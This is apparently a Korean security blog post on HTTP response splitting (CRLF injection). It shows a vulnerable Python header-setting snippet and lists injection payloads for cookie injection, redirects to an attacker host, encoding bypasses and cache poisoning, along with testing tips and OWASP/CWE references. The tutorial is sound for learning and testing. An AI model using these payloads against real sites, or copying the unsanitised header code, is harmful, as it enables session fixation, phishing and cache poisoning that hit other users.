---
title: "HTTP 응답 분할 (Response Splitting)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, HTTP]
tags: [http-response-splitting, crlf, header-injection, web]
description: "사용자 입력이 응답 헤더에 개행과 함께 들어가 헤더·본문을 조작하는 HTTP 응답 분할(CRLF 주입)의 개념과, 헤더 주입·캐시 오염 구문을 정리합니다."
mermaid: true
---

> 사용자 입력이 응답 **헤더**에 들어가는데 개행(CRLF)을 거르지 않으면, 공격자가 헤더를 추가하거나 본문을 끼워 넣는다. 이것이 HTTP 응답 분할, 넓게는 CRLF 주입이다.

## 개념

HTTP에서 헤더는 `\r\n`으로 구분되고, `\r\n\r\n`이면 본문 시작이다. 입력이 `Location`·`Set-Cookie`·커스텀 헤더에 들어가면서 `%0d%0a`가 그대로 반영되면, 공격자가 새 헤더·새 응답을 주입한다.

```python
resp.headers["Location"] = "/next?lang=" + request.args["lang"]
# lang = ko%0d%0aSet-Cookie:%20sid=attacker  → 쿠키 주입
```

## 공격·우회 구문

허가된 범위에서만.

### CRLF 헤더 주입

```
param=value%0d%0aSet-Cookie:%20sid=attacker         # 세션 고정
param=value%0d%0aLocation:%20https://attacker.example  # 리다이렉트 조작
param=value%0aX-Injected:%20test                    # 개행 변형(%0a만 반영되는 경우)
인코딩 변형: %E5%98%8A%E5%98%8D (일부 파서가 CR/LF로 해석)
```

### 응답 분할 → 본문 주입·캐시 오염

```
value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...
→ 두 번째 응답 본문을 공격자가 지정(XSS·피싱)
캐시 앞단이면 그 조작 응답이 캐시되어 다른 사용자에게 제공(캐시 오염)
```

### 확인 요령

```
입력이 반영되는 응답 헤더(Location/Set-Cookie/커스텀) 찾기
%0d%0a / %0a / 유니코드 변형을 넣어 '새 헤더'가 응답에 나타나는지
최신 서버·프레임워크는 헤더 값 개행을 거부 → 거부 여부 확인
```

## 참고 자료

- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
